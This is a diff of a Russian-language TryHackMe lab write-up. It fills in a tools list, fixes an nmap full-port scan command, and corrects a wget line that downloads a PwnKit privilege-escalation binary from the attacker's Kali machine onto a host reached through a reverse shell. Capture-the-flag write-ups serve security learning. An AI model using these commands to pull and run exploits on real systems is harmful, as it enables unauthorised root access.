@@ -12,7 +12,7 @@
 
 ### **Лаборатория: TryHackMe, все действия легитимны**
 
-**Инструменты: **
+**Инструменты: nmap, curl, nc, gcc, python3, wget**
 
 ---
 
@@ -21,7 +21,7 @@
 Давайте с самого начала запустим сканирование с флагом `-sV`, чтобы узнать какие порты открыты и версии портов, и флаг `-p-` чтобы просканировались все 65535 порта:
 
 ```bash
-sudo nmap -sV 10.112.162.178 -p-`
+sudo nmap -sV 10.112.162.178 -p-
 ```
 
 ![nmap results](images/nmap-results.jpg)
@@ -501,7 +501,7 @@ python3 -m http.server 8000
 А на `reverse-shell` скачиваем файл с kali:
 
 ```bash
-wget http:// 192.168.130.244:8000/PwnKit -O PwnKit
+wget http://192.168.130.244:8000/PwnKit -O PwnKit
 ```
 
 Теперь с `reverse-shell` меняем права с помощью `chmod`:
